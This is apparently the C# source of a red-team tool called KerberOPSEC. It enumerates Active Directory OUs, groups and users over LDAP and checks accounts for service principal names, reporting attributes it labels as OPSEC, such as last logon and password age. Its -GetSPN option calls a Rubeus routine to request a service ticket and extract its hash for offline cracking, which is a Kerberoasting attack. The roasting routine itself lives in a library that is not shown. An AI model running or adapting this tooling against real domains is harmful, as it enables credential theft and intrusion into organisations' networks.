using System;
using System.Text.RegularExpressions;
using System.DirectoryServices;
using System.Text;
using System.Collections;

namespace KerberOPSEC
{
    class KerberOPSEC
    {
        public static void GetDN()
        {
            try
            {
                DirectoryEntry RootDirEntry = new DirectoryEntry("LDAP://RootDSE");
                Object distinguishedName = RootDirEntry.Properties["defaultNamingContext"].Value;
                Console.WriteLine("---> " + distinguishedName);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
                return;
            }
        }
        public static void QueryLDAP(string tLDAP, string tQry, string tOption)
        {
            try
            {
                if (tOption == "-listous")
                {
                    DirectoryEntry directoryObject = new DirectoryEntry("LDAP://" + tLDAP);
                    DirectorySearcher subSearcher = new DirectorySearcher(directoryObject)
                    {
                        SearchScope = SearchScope.Subtree, // Do recurse down
                        Filter = tQry
                    };
                    foreach (SearchResult sub in subSearcher.FindAll())
                    {
                        // Get rid of "LDAP://"
                        Console.WriteLine("---> " + sub.Path.Remove(0, 7).ToString());
                    }
                }
                else
                {
                    DirectoryEntry directoryObject = new DirectoryEntry("LDAP://" + tLDAP);
                    DirectorySearcher subSearcher = new DirectorySearcher(directoryObject)
                    {
                        SearchScope = SearchScope.OneLevel, // Don't recurse down
                        Filter = tQry
                    };
                    foreach (SearchResult sub in subSearcher.FindAll())
                    {
                        // Get rid of "LDAP://"
                        Console.WriteLine("---> " + sub.Path.Remove(0, 7).ToString());
                    }
                }
            }
            catch (Exception)
            {
                Console.WriteLine("Check arguments and quotes...");
                return;
            }
        }
        public static void QueryLDAPGroup(string tLDAP)
        {
            try 
            {
                Match dnMatch = Regex.Match(tLDAP, "(?<Domain>DC=.*)", RegexOptions.IgnoreCase);
                string domainDN = dnMatch.Groups["Domain"].ToString();
                string domain = domainDN.Replace("DC=", "").Replace(',', '.');

                // Get rid of "LDAP://DOMIAN/"
                int rmDN = domain.Length + 8;

                DirectoryEntry directoryObject = new DirectoryEntry("LDAP://" + domain);
                DirectorySearcher subSearcher = new DirectorySearcher(directoryObject);
                subSearcher.Filter = "(&(memberof:1.2.840.113556.1.4.1941:=" + tLDAP + "))";
                subSearcher.SearchScope = SearchScope.Subtree;
                subSearcher.PropertiesToLoad.Add("cn");

                SearchResultCollection srcUsers = subSearcher.FindAll();

                foreach (SearchResult srcUser in srcUsers)
                {
                    Console.WriteLine("Users:\r\n");
                    Console.WriteLine("---> {0}", srcUser.Path.Remove(0, rmDN).ToString());
                }
            }
            catch (Exception)
            {
                Console.WriteLine("Check arguments and quotes?");
                return;
            }
        }
        public static void CheckSPN(string tLDAP)
        {
            //http://www.codedigest.com/CodeDigest/33-Get-All-Attributes-or-Properties-available-in-Active-Directory-in-C-.aspx
            try
            {
                DirectoryEntry directoryObject = new DirectoryEntry
                {
                    Path = "LDAP://" + tLDAP
                };

                Match uMatch = Regex.Match(tLDAP, "(?<User>CN=.*)", RegexOptions.IgnoreCase);
                string userDN = uMatch.Groups["User"].ToString();
                string user = userDN.Replace("CN=", "");
                user = user.Substring(0, user.IndexOf(','));
                user = user.ToLower();

                DirectorySearcher subSearcher = new DirectorySearcher(directoryObject)
                {
                    Filter = "(sAMAccountName=" + user + ")",
                };

                subSearcher.PropertiesToLoad.AddRange(new string[] { 
                    "sAMAccountName",
                    "Description",
                    "servicePrincipalName",
                    "whenCreated",
                    "whenChanged",
                    "userAccountControl",
                    "msds-SupportedEncryptionTypes",
                    "PwdLastSet",
                    "LastLogon"
                });
                foreach (SearchResult sResult in subSearcher.FindAll())
                {
                    if (sResult != null)
                    {
                        // Check for SPN
                        if (sResult.Properties["servicePrincipalName"].Count == 1)
                        {
                            Console.WriteLine(">> SPN Found! <<");
                            Console.WriteLine("[+] OPSEC Attributes:");
                            Console.WriteLine();

                            Console.WriteLine("---> sAMAccountName                : " + sResult.Properties["sAMAccountName"][0].ToString());

                            // Check if there is a description
                            if (sResult.Properties["Description"].Count == 1)
                            {
                                Console.WriteLine("---> Description                   : " + sResult.Properties["Description"][0].ToString());
                            }
                            else
                            {
                                Console.WriteLine("---> Description                   : ");
                            }

                            Console.WriteLine("---> servicePrincipalName          : " + sResult.Properties["servicePrincipalName"][0].ToString());

                            Console.WriteLine("---> whenCreated                   : " + sResult.Properties["whenCreated"][0].ToString());

                            Console.WriteLine("---> whenChanged                   : " + sResult.Properties["whenChanged"][0].ToString());

                            Console.WriteLine("---> userAccountControl            : " + sResult.Properties["userAccountControl"][0].ToString());

                            Console.WriteLine("---> SupportedEncryptionTypes      : " + sResult.Properties["msds-SupportedEncryptionTypes"][0].ToString());

                            long pwdSet = (long)sResult.Properties["PwdLastSet"][0];
                            DateTime dtPwdSet = DateTime.FromFileTime(pwdSet);
                            Console.WriteLine("---> PwdLastSet                    : " + dtPwdSet);

                            long LastLogon = (long)sResult.Properties["LastLogon"][0];
                            DateTime dtLastLogon = DateTime.FromFileTime(LastLogon);
                            Console.WriteLine("---> LastLogon                     : " + dtLastLogon);
                        }
                        else
                        {
                            Match dnMatch = Regex.Match(tLDAP, "(?<Domain>DC=.*)", RegexOptions.IgnoreCase);
                            string domainDN = dnMatch.Groups["Domain"].ToString();
                            string domain = domainDN.Replace("DC=", "").Replace(',', '.');
                            Console.WriteLine("---> No SPN found for {0}@{1}", user, domain);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                return;
            }
        }
        static void Main(string[] args)
        {
            // Define LDAP queries for use
            string searchOU = "(objectClass=organizationalUnit)";
            string searchGroup = "(objectClass=group)";
            string searchUsers = "(sAMAccountType=805306368)";
            //string searchComputers = "(sAMAccountType=805306369)";

            // Initialize variables for use
            string option;
            string targetLDAP = "";
            string targetSPN = "";

            // Put arguments into the right spot
            try
            {
                option = args[0].ToLower();
                if (args.Length == 2)
                {
                    targetLDAP = args[1];
                }
                if (args.Length >= 3)
                {
                    targetLDAP = args[1];
                    targetSPN = args[2];
                }
            }
            catch
            {
                Console.WriteLine("Missing arguments...try -h for Help?");
                return;
            }
            // Print the help
            if (option == "-h")
            {
                Console.WriteLine();
                Console.WriteLine("-GetDN                                  : Retreives current domain Distinguished Name");
                Console.WriteLine("-ListOUs <DomainDistinguishedName>      : Lists all OUs in the domain");
                Console.WriteLine("-CheckOU <OUDistinguishedName>          : Checks an OU for sub-OUs, Groups, and Users");
                Console.WriteLine("-CheckGroup <GroupDistinguishedName>    : Checks a Group for Users");
                Console.WriteLine("-CheckSPN <UserDistinguishedName>       : Checks an account for an SPN and shows OPSEC info");
                Console.WriteLine("-GetSPN <UserDistinguishedName> <SPN>   : Retreives hash for specified SPN");
            }
            // Get the Distinguished Name
            if (option == "-getdn")
            {
                Console.WriteLine();
                Console.WriteLine("Distinguished Name:\r\n");
                GetDN();
            }
            // List all the OUs in the domain
            else if (option == "-listous")
            {
                Console.WriteLine();
                Console.WriteLine("OUs:\r\n");
                QueryLDAP(targetLDAP, searchOU, option);
            }
            // Check a specific OU of interest for sub-OUs, groups, and users 
            else if (option == "-checkou")
            {
                Console.WriteLine();
                Console.WriteLine("OUs:\r\n");
                QueryLDAP(targetLDAP, searchOU, option);

                Console.WriteLine();
                Console.WriteLine("Groups:\r\n");
                QueryLDAP(targetLDAP, searchGroup, option);

                Console.WriteLine();
                Console.WriteLine("Users:\r\n");
                QueryLDAP(targetLDAP, searchUsers, option);
            }
            // Check a group for users
            else if (option == "-checkgroup")
            {
                Console.WriteLine();
                QueryLDAPGroup(targetLDAP);
            }
            // Check if user has SPN and get OPSEC details
            else if (option == "-checkspn")
            {
                Console.WriteLine();
                CheckSPN(targetLDAP);
            }
            // Request the SPN's ticket and hash
            else if (option == "-getspn")
            {
                Console.WriteLine();
                RubeusRoast.Roast.GetTGSRepHash(targetLDAP, targetSPN);
            }
        }
    }
}
